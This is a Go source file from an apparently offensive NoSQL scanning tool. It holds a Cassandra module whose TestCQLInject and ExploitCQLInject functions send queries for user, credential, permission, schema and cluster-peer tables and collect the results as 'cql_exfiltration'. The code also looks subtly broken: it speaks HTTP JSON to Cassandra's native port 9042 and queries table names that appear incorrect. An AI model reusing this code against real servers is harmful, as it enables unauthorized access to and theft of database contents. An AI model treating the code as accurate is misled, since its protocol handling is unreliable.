package nosql

import (
	"encoding/json"
	"fmt"
	"strings"
	"time"
)

type CassandraScanner struct {
	config *NoSQLConfig
	client *HTTPClient
}

func NewCassandraScanner(config *NoSQLConfig, client *HTTPClient) *CassandraScanner {
	return &CassandraScanner{
		config: config,
		client: client,
	}
}

func (c *CassandraScanner) TestConnection(target string) bool {
	url := BuildURL(target, "/", 9042)
	_, body, err := c.client.Get(url, nil)
	if err != nil {
		return false
	}
	return strings.Contains(string(body), "CQL")
}

func (c *CassandraScanner) GetVersion(target string) string {
	url := BuildURL(target, "/", 9042)
	_, body, err := c.client.Get(url, nil)
	if err != nil {
		return ""
	}

	output := string(body)
	if strings.Contains(output, "version") {
		lines := strings.Split(output, "\n")
		for _, line := range lines {
			if strings.Contains(line, "version") {
				parts := strings.Split(line, ":")
				if len(parts) > 1 {
					return strings.TrimSpace(parts[1])
				}
			}
		}
	}
	return ""
}

func (c *CassandraScanner) ListKeyspaces(target string) []string {
	url := BuildURL(target, "/", 9042)

	payload := `{
		"query": "SELECT keyspace_name FROM system_schema.keyspaces"
	}`

	body := strings.NewReader(payload)
	_, resp, err := c.client.Post(url, body, map[string]string{
		"Content-Type": "application/json",
	})
	if err != nil {
		return nil
	}

	var result map[string]interface{}
	if json.Unmarshal(resp, &result) != nil {
		return nil
	}

	var keyspaces []string
	if rows, ok := result["rows"].([]interface{}); ok {
		for _, row := range rows {
			if rowMap, ok := row.(map[string]interface{}); ok {
				if keyspace, ok := rowMap["keyspace_name"].(string); ok {
					keyspaces = append(keyspaces, keyspace)
				}
			}
		}
	}
	return keyspaces
}

func (c *CassandraScanner) TestCQLInject(target string) *InjectionPoint {
	url := BuildURL(target, "/", 9042)

	payloads := []struct {
		query   string
		desc    string
	}{
		{"SELECT * FROM system.users", "system_users_access"},
		{"SELECT * FROM system_schema.tables", "schema_enumeration"},
		{"SELECT * FROM system.auth_users", "auth_users_access"},
		{"SELECT * FROM system.permission", "permission_access"},
	}

	for _, p := range payloads {
		payload := fmt.Sprintf(`{"query": "%s"}`, p.query)
		body := strings.NewReader(payload)
		resp, respBody, err := c.client.Post(url, body, map[string]string{
			"Content-Type": "application/json",
		})
		if err != nil {
			continue
		}

		if resp.StatusCode == 200 {
			var result map[string]interface{}
			if json.Unmarshal(respBody, &result) == nil {
				if _, ok := result["rows"]; ok {
					return &InjectionPoint{
						ID:        GenerateID(),
						Target:    target,
						DBType:    NoSQLDBCassandra,
						Technique: TechniqueCQLInject,
						Field:     "query",
						Payload:   p.query,
						Parameters: map[string]string{
							"method": "cql_injection",
							"type":   p.desc,
						},
						Severity:  SeverityHigh,
						Verified:  true,
						Timestamp: time.Now(),
					}
				}
			}
		}
	}
	return nil
}

func (c *CassandraScanner) ExploitCQLInject(injection *InjectionPoint) (map[string]interface{}, error) {
	url := BuildURL(injection.Target, "/", 9042)

	data := make(map[string]interface{})

	queries := []struct {
		query string
		key   string
	}{
		{"SELECT keyspace_name FROM system_schema.keyspaces", "keyspaces"},
		{"SELECT * FROM system_schema.tables", "tables"},
		{"SELECT * FROM system_schema.columns", "columns"},
		{"SELECT * FROM system.peers", "peers"},
		{"SELECT * FROM system.local", "local"},
	}

	for _, q := range queries {
		payload := fmt.Sprintf(`{"query": "%s"}`, q.query)
		body := strings.NewReader(payload)
		_, resp, err := c.client.Post(url, body, map[string]string{
			"Content-Type": "application/json",
		})
		if err != nil {
			data[q.key] = fmt.Sprintf("Error: %v", err)
			continue
		}

		var result map[string]interface{}
		if json.Unmarshal(resp, &result) == nil {
			data[q.key] = result
		} else {
			data[q.key] = string(resp)
		}
	}

	data["method"] = "cql_exfiltration"
	return data, nil
}
